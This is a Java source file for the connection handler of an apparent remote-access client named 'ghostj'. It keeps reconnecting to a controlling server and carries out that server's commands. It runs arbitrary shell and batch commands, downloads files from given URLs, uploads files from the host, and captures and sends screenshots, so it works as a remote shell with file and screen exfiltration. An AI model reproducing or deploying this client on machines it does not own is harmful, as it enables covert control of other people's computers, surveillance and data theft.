package com.ghostj.client;

import com.ghostj.util.TimeUtil;
import com.rft.core.client.FileSender;
import com.sun.xml.internal.bind.v2.TODO;
import test.ClientTest;

import java.io.*;
import java.net.Socket;
import java.util.Arrays;
import java.util.Date;

public class HandleConn extends Thread{
    @Override
    public void run(){
        //反复尝试连接
        while (true){
            try {
                long st=new Date().getTime();
                try {
                    ClientMain.socket=new Socket();
                    ClientMain.socket.connect(ClientMain.socketAddress, 30000);
                } catch (IOException e) {
                    Out.say("HandleConn","无法建立连接，正在尝试重新连接");
                    e.printStackTrace();
                    try{ sleep(15000-(new Date().getTime()-st)); }catch (Exception ignored){ ; }
                    continue;
                }
                ClientMain.bufferedWriter=new OutputStreamWriter(ClientMain.socket.getOutputStream(),"GBK");
                ClientMain.bufferedReader=new BufferedReader(new InputStreamReader(ClientMain.socket.getInputStream(),"GBK"));
                //连接正常
                Out.say("HandleConn","已连接");
//                //发送name
//                ClientMain.bufferedWriter.write("!name "+ClientMain.name+"!");
//                //ClientMain.bufferedWriter.newLine();
//                ClientMain.bufferedWriter.flush();
//                Out.say("HandleConn","Sent name.");
//                //发送版本号
//                String ver= FileRW.read("nowVer.txt");
//                ClientMain.bufferedWriter.write("!version "+ver+"!");
//                ClientMain.bufferedWriter.flush();

                //发送info
                ClientMain.bufferedWriter.write("!info "+ClientMain.name+" c"+FileRW.read("nowVer.txt")+" "+ClientMain.sysStartTime+"!");
                ClientMain.bufferedWriter.flush();
                readMsg:while(true){
                    String cmd= ClientMain.bufferedReader.readLine();
                    //接收到数据
                    //Out.say("HandleConn",""+cmd);

                    //检查是否是工作指令
                    try {//这个try保证了在执行命令时发生的非连接异常不会时连接重置
                        String cmd0[] = cmd.split(" ");
                        switch (cmd0[0]) {
                            case "#alive#": {
                                ClientMain.success = true;
                                continue;
                            }
                            case "#alives#": {
                                ClientMain.bufferedWriter.write("!alives!");
                                ClientMain.bufferedWriter.flush();
                                continue;
                            }
                            case "!!gget": {
                                if (cmd0.length < 4) {

                                    ClientMain.bufferedWriter.write("正确语法\n!!gget <url> <savePath> <fileName>\n");
                                    ClientMain.bufferedWriter.flush();
                                    ClientMain.sendFinishToServer();
                                    continue;
                                }
                                try {
                                    ClientMain.bufferedWriter.write("正在下载\n");
                                    ClientMain.bufferedWriter.flush();
                                    new Thread(() -> {
//                                            super.run();
                                        try {
//                                            Downloader.downloadFromUrl(cmd0[1], cmd0[3], cmd0[2], "dl"+new Date().getTime());
                                            Downloader.downLoadFromUrl(cmd0[1], cmd0[3], cmd0[2], "dl"+new Date().getTime());
                                            ClientMain.bufferedWriter.write("完成\n");
                                            ClientMain.bufferedWriter.flush();
                                        }catch (Exception e) {
                                            e.printStackTrace();
                                            try {
                                                ClientMain.bufferedWriter.write("下载出错\n" + getErrorInfo(e));
                                                ClientMain.bufferedWriter.flush();
                                            }catch (Exception err){}
                                        }
                                    }).start();
                                } catch (Exception e) {
                                    ClientMain.bufferedWriter.write("下载出错\n" + getErrorInfo(e));
                                    ClientMain.bufferedWriter.flush();
                                }
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!reconn": {
                                ClientMain.socket.close();
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!help": {
                                String helpinfo = "client的help\n" +
                                        "!!gget <url> <savePath> <fileName>  从url下载文件\n" +
                                        "!!reconn  使客户端重启建立连接\n" +
                                        "!!help  显示此消息\n" +
                                        "!!name <newName>  修改客户端name\n" +
                                        "!!kill  kill当前客户端正在进行的process\n" +
                                        "\t（仅断开与process的连接，无法终止进程）\n" +
                                        "\n" +
                                        "!!listcfg  列出客户端的config所有字段\n" +
                                        "!!rmcfg <fieldKey>  删除客户端的config中指定字段\n" +
                                        "!!cfg <key> <value>  修改/增加客户端config中指定字段的值\n" +
                                        "!!writecfg  将客户端的config写入文件\n" +
                                        "\n" +
                                        "!!proc <oper> [param]  多任务控制系列指令\n" +
                                        "      oper列表:\n" +
                                        "      new <name> [初始指令]   新建名为name的任务，并指定初始指令\n" +
                                        "                             若未指定初始指令将自动以cmd启动新任务\n" +
                                        "      ls   列出所有此客户端的任务\n" +
                                        "      focus <name(wordStartWith)>  聚焦到name以参数开头的任务\n" +
                                        "      disc <fullName>  断连name为参数的任务\n" +
                                        "                       !!警告:这个命令不会杀死任务中启动的进程,并且会使client与此进程失去连接\n" +
                                        "   *process:未聚集时直接输入的指令将自动创建一个临时process\n" +
                                        "\n" +
                                        "!!bat <oper> [param]  客户端侧批处理文件系列指令\n" +
                                        "      oper列表:\n" +
                                        "      reset        清空现有批处理文件内容\n" +
                                        "      view         查看批处理文件内容\n" +
                                        "      add <命令...> 添加一行批处理命令\n" +
                                        "      run          执行批处理文件\n" +
                                        "   *客户端侧批处理文件:只有一个批处理文件被客户端操作\n" +
                                        "\n" +
                                        "!!rft <oper> [params..]  文件传输指令\n" +
                                        "      oper列表:\n" +
                                        "      upload <filePathOnClient> <savePathOnServer>  上传一个文件\n" +
                                        "\n" +
                                        "!!scr <picFile.png>  把屏幕截图保存到文件(png格式)\n";
                                ClientMain.bufferedWriter.write(helpinfo + "\n");
                                ClientMain.bufferedWriter.flush();
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!name": {
                                if (cmd0.length < 2) {
                                    ClientMain.bufferedWriter.write("正确语法\n!!name <newName>\n");
                                    ClientMain.bufferedWriter.flush();
                                    ClientMain.sendFinishToServer();
                                    continue;
                                }
                                ClientMain.name = cmd0[1];
                                ClientMain.config.set("name", cmd0[1]);
                                ClientMain.bufferedWriter.write("已修改名称为" + cmd0[1] + "\n");
                                ClientMain.bufferedWriter.flush();
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            //TODO 修改kill的机制
                            case "!!kill": {/*
                                if (ClientMain.processing()) {
                                    ClientMain.cmdError.stop();
                                    ClientMain.processCmd.process.destroy();
                                    ClientMain.processCmd.process.destroyForcibly();
                                    ClientMain.processCmd.stop();
//                                    ClientMain.processing = false;
                                    ClientMain.bufferedWriter.write("已终止当前任务\n");
                                    //ClientMain.bufferedWriter.newLine();
                                } else {
                                    ClientMain.bufferedWriter.write("无任务正在进行\n");
                                    //ClientMain.bufferedWriter.newLine();
                                }*/
                                ClientMain.bufferedWriter.write("kill命令已过时,使用!!proc disc指令\n");
                                ClientMain.bufferedWriter.flush();
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!listcfg": {
                                StringBuffer fields = new StringBuffer("客户端" + ClientMain.name + "的配置文件字段\n");
                                for (String key : ClientMain.config.field.keySet()) {
                                    fields.append(key + "=" + ClientMain.config.field.get(key) + "\n");
                                }
                                fields.append("列表完成");
                                ClientMain.bufferedWriter.write(fields.toString() + "\n");
                                ClientMain.bufferedWriter.flush();
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!rmcfg": {
                                if (cmd0.length >= 2) {
                                    try {
                                        ClientMain.config.field.remove(cmd0[1]);
                                        ClientMain.bufferedWriter.write("success\n");
                                        ClientMain.bufferedWriter.flush();
                                    } catch (Exception e) {
                                        ClientMain.bufferedWriter.write("删除失败" + getErrorInfo(e) + "\n");
                                        ClientMain.bufferedWriter.flush();
                                    }
                                } else {
                                    ClientMain.bufferedWriter.write("正确语法\n!!rmcfg <key>\n");
                                    ClientMain.bufferedWriter.flush();
                                }
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!cfg": {
                                if (cmd0.length >= 3) {
                                    ClientMain.config.set(cmd0[1], cmd0[2]);
                                    ClientMain.bufferedWriter.write("设置" + cmd0[1] + "=" + cmd0[2] + "\n");
                                    //ClientMain.bufferedWriter.newLine();
                                    ClientMain.bufferedWriter.flush();
                                    Out.say("HandleConn", "设置" + cmd0[1] + "=" + cmd0[2]);
                                } else {
                                    ClientMain.bufferedWriter.write("正确语法:\n!!cfg <key> <value>\n");
                                    //ClientMain.bufferedWriter.newLine();
                                    ClientMain.bufferedWriter.flush();

                                }
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!writecfg": {
                                ClientMain.config.write();
                                ClientMain.bufferedWriter.write("配置文件已写入\n");
                                //ClientMain.bufferedWriter.newLine();
                                ClientMain.bufferedWriter.flush();
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            case "!!proc":{
                                if(cmd0.length<2){
                                    ClientMain.bufferedWriter.write("proc命令语法不正确.\n");
                                    ClientMain.bufferedWriter.flush();
                                    ClientMain.sendFinishToServer();
                                    continue;
                                }
                                switch (cmd0[1]){
                                    case "focus":{
                                        if(cmd0.length<3){
                                            ClientMain.bufferedWriter.write("proc focus命令语法不正确.\n");
                                            ClientMain.bufferedWriter.flush();
                                            ClientMain.sendFinishToServer();
                                            continue;
                                        }
                                        for(String key:ClientMain.processList.keySet()){
                                            if(key.startsWith(cmd0[2])){
                                                ClientMain.focusedProcess=ClientMain.processList.get(key);
                                                ClientMain.bufferedWriter.write("聚焦process:"+key+"\n");
                                                ClientMain.bufferedWriter.flush();
                                                ClientMain.sendFinishToServer();
                                                continue readMsg;
                                            }
                                        }
                                        ClientMain.bufferedWriter.write("找不到"+cmd0[2]+"开头的process\n");
                                        ClientMain.bufferedWriter.flush();
                                        ClientMain.sendFinishToServer();
                                        continue;
                                        /*ClientMain.bufferedWriter.write("聚焦process:");
                                        ClientMain.bufferedWriter.flush();*/
                                    }
                                    case "ls":{
                                        ClientMain.bufferedWriter.write("列表所有此客户端已连接的process("+ClientMain.processList.size()+")\nkey\tinitCmd\tstartTime\tstate\n");
                                        ClientMain.bufferedWriter.flush();
                                        for(String key:ClientMain.processList.keySet()){
                                            ClientMain.bufferedWriter.write(key+"      "+ClientMain.processList.get(key).cmd+"         "
                                                    + TimeUtil.millsToMMDDHHmmSS(ClientMain.processList.get(key).startTime)+"   "+(ClientMain.focusedProcess==ClientMain.processList.get(key))+"\n");
                                        }
                                        ClientMain.bufferedWriter.write("列表完成.\n");
                                        ClientMain.bufferedWriter.flush();
                                        ClientMain.sendFinishToServer();
                                        continue;
                                    }
                                    case "new":{
                                        if(cmd0.length<3){
                                            ClientMain.bufferedWriter.write("proc new命令语法不正确.\n");
                                            ClientMain.bufferedWriter.flush();
                                            ClientMain.sendFinishToServer();
                                            continue;
                                        }
                                        ClientMain.bufferedWriter.write("新建进程:"+cmd0[2]+"\n");
                                        if(cmd0.length>=4){//如果有初始执行指令
                                            ProcessCmd processCmd = new ProcessCmd(cmd0[2]);
                                            processCmd.cmd = cmd0[3];
                                            ClientMain.processList.put(cmd0[2],processCmd);
                                            processCmd.start();
                                            ClientMain.sendFinishToServer();
                                        }else {
                                            ProcessCmd processCmd = new ProcessCmd(cmd0[2]);
                                            processCmd.cmd ="cmd";
                                            ClientMain.processList.put(cmd0[2],processCmd);
                                            processCmd.start();
                                            ClientMain.sendFinishToServer();
                                        }
                                        ClientMain.focusedProcess=ClientMain.processList.get(cmd0[2]);
                                        ClientMain.bufferedWriter.write("聚焦process:"+cmd0[2]+"\n");
                                        ClientMain.bufferedWriter.flush();
                                        continue;
                                    }
                                    case "disc":{
                                        if(cmd0.length<3){
                                            ClientMain.bufferedWriter.write("proc disc命令语法不正确.\n");
                                            ClientMain.bufferedWriter.flush();
                                            ClientMain.sendFinishToServer();
                                            continue;
                                        }
                                        //注意！！这里仅仅是断开与进程的连接而不是结束进程
                                        if(ClientMain.processList.containsKey(cmd0[2])){
                                            try {
                                                ClientMain.processList.get(cmd0[2]).process.destroy();
                                                ClientMain.removeProcess(cmd0[2]);
                                            }catch (Exception e){
                                                ClientMain.bufferedWriter.write("断连process时出现错误\n"+getErrorInfo(e));
                                                ClientMain.bufferedWriter.flush();
                                            }
                                        }else {
                                            ClientMain.bufferedWriter.write("仅能使用全名来断连process\n");
                                            ClientMain.bufferedWriter.flush();
                                        }
                                        ClientMain.sendFinishToServer();
                                        continue;
                                    }
                                    default:{
                                        writeToServer("!!proc 命令语法不正确\n");
                                        continue readMsg;
                                    }
                                }
                            }
                            case "!!exit":{
                                if (cmd0.length>=2&&"f".equals(cmd0[1])){
                                    System.exit(0);
                                }else if(!ClientMain.processing()){
                                    ClientMain.bufferedWriter.write("Exit client？Confirm(Yes/No):");
                                    ClientMain.bufferedWriter.flush();
//                                    ClientMain.sendFinishToServer();
                                    String confirm=ClientMain.bufferedReader.readLine();
                                    ClientMain.bufferedWriter.write(confirm+"\n");
                                    ClientMain.bufferedWriter.flush();
                                    if(confirm.equals("y")||confirm.equals("Y")||confirm.equals("yes")){
                                        System.exit(0);
                                    }else {
                                        ClientMain.bufferedWriter.write("Cancelled.\n");
                                        ClientMain.bufferedWriter.flush();
                                    }
                                }else {
                                    ClientMain.bufferedWriter.write("仍有正在进行的操作\n");
                                    ClientMain.bufferedWriter.flush();
                                }
                                ClientMain.sendFinishToServer();
                                continue;
                            }
                            //批处理系列命令
                            case "!!bat":{
                                if(cmd0.length<2){
                                    writeToServer("!!bat语法不正确\n");
                                    ClientMain.sendFinishToServer();
                                    continue readMsg;
                                }
                                if(!new File("batch.bat").exists()){
                                    FileRW.write("batch.bat","");
                                }
                                switch (cmd0[1]){
                                    case "reset":{
                                        FileRW.write("batch.bat","");
                                        writeToServer("已清空bat文件\n");
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                    case "add":{
                                        if(cmd0.length<3){
                                            writeToServer("!!bat add语法不正确\n");
                                            ClientMain.sendFinishToServer();
                                            continue readMsg;
                                        }
                                        StringBuffer newLine=new StringBuffer();
                                        for(int i=2;i<cmd0.length;i++){
                                            newLine.append(cmd0[i]+" ");
                                        }
                                        FileRW.write("batch.bat",newLine.toString()+"\n",true);
                                        writeToServer("已添加"+newLine+"\n");
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                    case "view":{
                                        String fileStr=FileRW.readWithLn("batch.bat");
                                        writeToServer("客户端的batch文件内容:\n"+fileStr+"共"+fileStr.length()+"个字符\n");
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                    case "run":{
                                        writeToServer("正在启动batch.bat批处理文件.\n");

                                        ProcessCmd processCmd = new ProcessCmd("batchFile");
                                        processCmd.cmd ="batch.bat";
                                        ClientMain.processList.put("batchFile",processCmd);
                                        ClientMain.focusedProcess=processCmd;
                                        processCmd.start();
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                    default:{
                                        writeToServer("!!bat 命令语法不正确\n");
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                }
                            }
                            /**
                             * 上传文件
                             */
                            case "!!rft":{
                                if(cmd0.length<2){
                                    writeToServer("!!rft 命令语法不正确");
                                    ClientMain.sendFinishToServer();
                                    continue readMsg;
                                }
                                switch (cmd0[1]){
                                    case "upload":{//!!rft upload <filePath> <savePath>
                                        if(cmd0.length<4){
                                            writeToServer("!!rft upload 命令语法不正确");
                                            ClientMain.sendFinishToServer();
                                            continue readMsg;
                                        }
                                        FileSender.sendFile(new File(cmd0[2]),cmd0[3],new Date().getTime()+"", ClientMain.ip,ClientMain.rft_port);
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                    default:{
                                        writeToServer("!!rft命令语法不正确,无此二级命令");
                                        ClientMain.sendFinishToServer();
                                        continue readMsg;
                                    }
                                }
                            }
                            case "!!scr":{
                                if(cmd0.length<2){
                                    writeToServer("!!scr 命令语法不正确");
                                    ClientMain.sendFinishToServer();
                                    continue readMsg;
                                }
                                try {
                                    Thread t=new Thread(() -> {
	                                    try {
		                                    writeToServer("正在创建屏幕截图\n");
		                                    PrtScreen.saveScreen(cmd0[1]);
		                                    writeToServer("成功将截图保存到 " + cmd0[1] + "\n");
	                                    } catch (Exception e) {
		                                    writeToServer("获取屏幕截图失败:" + getErrorInfo(e)+"\n");
	                                    }


                                        writeToServer("!sendpicurl prtscr/"+ClientMain.name+"/"+cmd0[1]+"!");
	                                    try {
		                                    //发送到服务器
		                                    FileSender.sendFile(new File(cmd0[1]), "prtscr/"+ClientMain.name, "prtscr" + new Date().getTime(), ClientMain.ip, ClientMain.rft_port);
//	                                        writeToServer("成功上传截图到:"+ClientMain.ip+"\n");
//	                                        writeToServer("!sendpicurl prtscr/"+ClientMain.name+"/"+cmd0[1]+"!");
	                                    }catch (Exception e){
	                                    	writeToServer("无法将截图上传至服务器"+"\n");
	                                    }
                                        ClientMain.sendFinishToServer();
                                    });
                                    t.start();
                                }catch (Exception e){
                                    writeToServer("获取屏幕截图失败:" + getErrorInfo(e)+"\n");
                                }
//                                ClientMain.sendFinishToServer();
                                continue readMsg;
                            }
                        }
//                        Out.say("HandleConn","get:"+cmd+" processing?"+ClientMain.processing());
                        //处理收到的消息
                        //TODO 修改传递命令的机制
                        /*if (!ClientMain.processing()) {//无正在进行的操作
                            ClientMain.processCmd = new ProcessCmd();
                            ClientMain.processCmd.cmd = new String(cmd);
                            ClientMain.processCmd.start();
                            ClientMain.sendFinishToServer();
                        } else {//正在进行
                            //System.out.print("passing cmd");
                            ClientMain.processWriter.write(cmd);
                            ClientMain.processWriter.newLine();
                            ClientMain.processWriter.flush();
                            ClientMain.sendFinishToServer();
                        }*/
                        if(ClientMain.focusedProcess==null){
                            /*ClientMain.bufferedWriter.write("客户端没有聚焦process,使用!!proc focus以聚焦\n");
                            ClientMain.bufferedWriter.flush();*/
                            //自动创建一个以现在时间为名的process
                            writeToServer("自动新建一个process\n");

                            String name=(new Date().getTime()+"");
                            String realName=name.substring(name.length()-10,name.length());
                            ProcessCmd processCmd = new ProcessCmd(realName);
                            processCmd.cmd = cmd;
                            ClientMain.processList.put(realName,processCmd);
                            ClientMain.focusedProcess=processCmd;
                            processCmd.start();
                        }else {

                            ClientMain.focusedProcess.processWriter.write(cmd);
                            ClientMain.focusedProcess.processWriter.newLine();
                            ClientMain.focusedProcess.processWriter.flush();
                        }
                        ClientMain.sendFinishToServer();
                    }catch (Exception e){
                        e.printStackTrace();
                        ClientMain.bufferedWriter.write("处理信息时发生错误\n"+getErrorInfo(e));
                        //ClientMain.bufferedWriter.newLine();
                        ClientMain.bufferedWriter.flush();
                        ClientMain.sendFinishToServer();
                    }
                }
            }catch (Exception e){

                Out.say("HandleConn","连接错误");
                e.printStackTrace();
                try {
                    ClientMain.socket.close();
                }catch (Exception e0){
                    ;
                }
                continue;
            }
        }
    }
    public String getErrorInfo(Exception e){
        StringWriter sw=new StringWriter();
        PrintWriter pw=new PrintWriter(sw);
        e.printStackTrace(pw);
        return sw.toString().replaceAll("\t","    ");
    }
    public void writeToServer(String msg){

        try {
            ClientMain.bufferedWriter.write(msg);
            ClientMain.bufferedWriter.flush();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
